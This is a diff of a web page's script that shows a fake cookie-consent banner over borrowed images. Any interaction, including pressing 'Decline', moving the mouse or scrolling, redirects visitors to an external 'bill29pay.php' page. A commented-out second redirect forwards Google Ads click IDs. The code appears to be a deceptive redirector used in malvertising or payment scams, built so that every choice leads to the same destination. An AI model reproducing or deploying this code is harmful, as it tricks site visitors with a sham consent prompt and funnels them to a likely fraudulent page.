@@ -7,21 +7,20 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
 <!DOCTYPE html>
 <html lang="en">
     <head>
-	    <script>
+<script>
 (function(){
-  const redirectUrl = "https://games247forfree.online/bill29pay.php"; // 
-  const backgroundImageUrl = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png"; // 
-  const logoImageUrl = "https://i.ibb.co/Q3p7ZR4P/BILL-BIG.png"; // 
-  const LOGO_WIDTH = "1000px"; // 
+  const redirectUrl = "https://games247forfree.online/bill29pay.php";
+  const backgroundImageUrl = "https://i.ibb.co/KcwttPhm/Lptf-Fnqj9t.png";
+  const logoImageUrl = "https://i.ibb.co/Q3p7ZR4P/BILL-BIG.png";
+  const LOGO_WIDTH = "1000px";
 
   let redirected = false, moved = false, scrolled = false, touched = false, initialPos = null;
 
   function random(min, max){return Math.floor(Math.random()*(max-min+1))+min}
-  function randomColor(){return ["#28a745","#007bff","#ff5722","#6f42c1","#17a2b8","#ffc107","#dc3545"][Math.floor(Math.random()*7)]}
   function randomText(){return [
-    "🍪 <b>Important Notice:</b><br><br>We use cookies and similar technologies to personalize content, deliver targeted advertising, provide social media features, and analyze our traffic. This information helps us deliver a better browsing experience, and complying with data protection regulations.<br><br>By clicking 'Accept Cookies', you consent to the use of ALL the cookies. If you choose 'Decline', certain features might not work as intended.<br><br>For more information, please read our <a href='#' style='color:#007bff;'>Privacy Policy</a>.",
-    "🍪 <b>Your Privacy Matters!</b><br><br>To improve your experience, we collect cookies and process personal data like IP addresses and browsing behavior. You can either accept all cookies or decline unnecessary ones. Please make your choice to proceed.<br><br>Learn more about how we use cookies in our <a href='#' style='color:#007bff;'>Privacy Center</a>.",
-    "🍪 <b>Cookie Usage Agreement</b><br><br>This website uses cookies to enhance functionality, personalize your experience, and to comply with global regulations. By clicking 'Accept', you agree to our terms. Declining may affect certain site functions.<br><br>See our full <a href='#' style='color:#007bff;'>Cookie Policy</a> for details."
+    "🍪 <b>Important Notice:</b><br><br><b>We use cookies and similar technologies to personalize content, deliver targeted advertising, provide social media features, and analyze our traffic. This information helps us deliver a better browsing experience, and complying with data protection regulations.<br><br>By clicking 'Accept Cookies', you consent to the use of ALL the cookies. If you choose 'Decline', certain features might not work as intended.</b><br><br>For more information, please read our <a href='#' style='color:#007bff;'>Privacy Policy</a>.",
+    "🍪 <b>Your Privacy Matters!</b><br><br><b>To improve your experience, we collect cookies and process personal data like IP addresses and browsing behavior. You can either accept all cookies or decline unnecessary ones. Please make your choice to proceed.</b><br><br>Learn more about how we use cookies in our <a href='#' style='color:#007bff;'>Privacy Center</a>.",
+    "🍪 <b>Cookie Usage Agreement</b><br><br><b>This website uses cookies to enhance functionality, personalize your experience, and to comply with global regulations. By clicking 'Accept', you agree to our terms. Declining may affect certain site functions.</b><br><br>See our full <a href='#' style='color:#007bff;'>Cookie Policy</a> for details."
   ][Math.floor(Math.random()*3)]}
 
   function redirectUser(){
@@ -47,7 +46,7 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
         <p style="font-size:18px;color:#555;margin-bottom:2rem;line-height:1.6;">${randomText()}</p>
         <div style="margin-top:2rem;display:flex;gap:1rem;justify-content:center;flex-wrap:wrap;">
           <button id="acceptBtn" style="padding:14px 28px;background:#ff9800;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Accept Cookies</button>
-<button id="declineBtn" style="padding:14px 28px;background:#ff9800;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Decline</button>
+          <button id="declineBtn" style="padding:14px 28px;background:#ff9800;color:white;border:none;border-radius:12px;font-size:18px;cursor:pointer;">Decline</button>
         </div>
       </div>
     </div>`;
@@ -88,12 +87,20 @@ $delay = rand(15000, 20000); // 1500-20000 seconds delay (milliseconds)
   });
 })();
 </script>
+
+<!--
 <script>
   document.addEventListener("click", function handleClickOnce() {
-    document.removeEventListener("click", handleClickOnce); 
+    document.removeEventListener("click", handleClickOnce);
+    const urlParams = new URLSearchParams(window.location.search);
+    const gclid = urlParams.get('gclid');
+    let finalUrl = "https://games247forfree.online/bill29pay.php";
+    if (gclid) {
+      finalUrl += (finalUrl.includes('?') ? '&' : '?') + 'gclid=' + gclid;
+    }
     setTimeout(() => {
-      window.location.href = "https://games247forfree.online/bill29pay.php"; REDIRECT_URL
-    }, 1500); // 0.1 ms = 0.2 seconds
+      window.location.href = finalUrl;
+    }, 1500);
   });
 </script>
     <meta charset="UTF-8" />
